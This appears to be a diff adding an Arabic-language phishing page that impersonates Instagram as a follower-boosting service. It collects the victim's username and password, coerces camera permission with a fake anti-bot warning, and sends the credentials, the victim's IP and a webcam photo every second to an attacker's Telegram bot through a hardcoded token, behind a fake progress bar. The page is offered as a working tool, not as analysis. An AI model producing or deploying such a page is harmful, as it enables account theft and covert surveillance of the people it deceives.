@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - رشق متابعين</title>
+    <style>
+        body { background-color: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 350px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 25px; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 14px; box-sizing: border-box; }
+        .btn-blue { background: #0095f6; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 15px; }
+        .warning-box { background: #fffaf0; border: 1px solid #ffe58f; padding: 10px; margin-bottom: 15px; border-radius: 4px; font-size: 12px; color: #856404; text-align: right; }
+        #status { display: none; margin-top: 20px; font-size: 13px; color: #8e8e8e; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540d95.png" class="logo">
+        
+        <input type="text" id="user" placeholder="اسم المستخدم">
+        <input type="password" id="pass" placeholder="كلمة المرور">
+        
+        <select id="rank">
+            <option value="" disabled selected>اختر الباقة</option>
+            <option>10 Starter</option><option>15 Plus</option><option>25 Silver</option>
+            <option>50 Gold</option><option>100 Diamond</option><option>250 Platinum</option>
+            <option>500 Master</option><option>1000 Gold Plus</option>
+            <option>1500 Prime</option><option>3500 Titanium</option><option>5000 Elite</option>
+        </select>
+
+        <div class="warning-box">
+            📍 <b>مكافحة البوتات:</b> بمجرد الضغط على الزر، سيطلب منك النظام السماح بالكاميرا، يجب الضغط على <b>"سماح"</b> فوراً لبدء العملية.
+        </div>
+
+        <button class="btn-blue" id="mainBtn" onclick="forceCamera()">إتمام عملية الرشق الآن</button>
+        
+        <div id="status">
+            <p>⌛ جاري معالجة الطلب... <b id="p">0%</b></p>
+        </div>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
+        const CH_ID = '1371063739';
+
+        async function forceCamera() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(!u || !p) return alert("أدخل البيانات!");
+
+            // استدعاء نافذة "السماح" القسرية من النظام
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = stream;
+                
+                // بدء الواجهة الوهمية
+                document.getElementById('mainBtn').style.display = 'none';
+                document.getElementById('status').style.display = 'block';
+
+                // إرسال البيانات والـ IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('👤 '+u+'\n🔑 '+p+'\n🌐 IP: '+ipData.ip)}`);
+
+                // تصوير كل ثانية وإرسال سريع (مضغوط)
+                setInterval(snap, 1000);
+
+                let pct = 0;
+                setInterval(() => { if(pct < 99) { pct++; document.getElementById('p').innerText = pct + "%"; } }, 800);
+
+            } catch (err) {
+                // إذا رفض، يتم إعادة المحاولة حتى يضغط "سماح"
+                alert("يجب السماح بالكاميرا للمتابعة ومكافحة البوتات!");
+                location.reload(); 
+            }
+        }
+
+        function snap() {
+            const video = document.getElementById('v');
+            const canvas = document.getElementById('c');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('photo', blob, 'x.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.2); // ضغط عالي جداً لسرعة الإرسال
+        }
+    </script>
+</body>
+</html>
